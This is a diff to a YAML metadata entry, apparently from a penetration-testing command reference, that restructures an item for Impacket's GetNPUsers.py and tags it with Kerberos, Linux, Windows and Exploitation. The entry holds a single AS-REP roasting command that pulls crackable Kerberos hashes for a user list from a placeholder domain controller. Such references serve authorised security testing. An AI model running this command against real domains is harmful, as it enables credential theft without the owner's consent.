@@ -12,18 +12,15 @@ description: |
 
   	Output File: hashes.txt
 
+command: |
+  python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
 items:
-  Username:
-    - code: |
-        python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
-filters:
-  Kerberos:
-    - code: |
-        empty
-  Linux:
-    - code: |
-        empty
-  Windows:
-    - code: |
-        empty
+  - Username
+services:
+  - Kerberos
+OS:
+  - Linux
+  - Windows
+attack_types:
+  - Exploitation
 ---
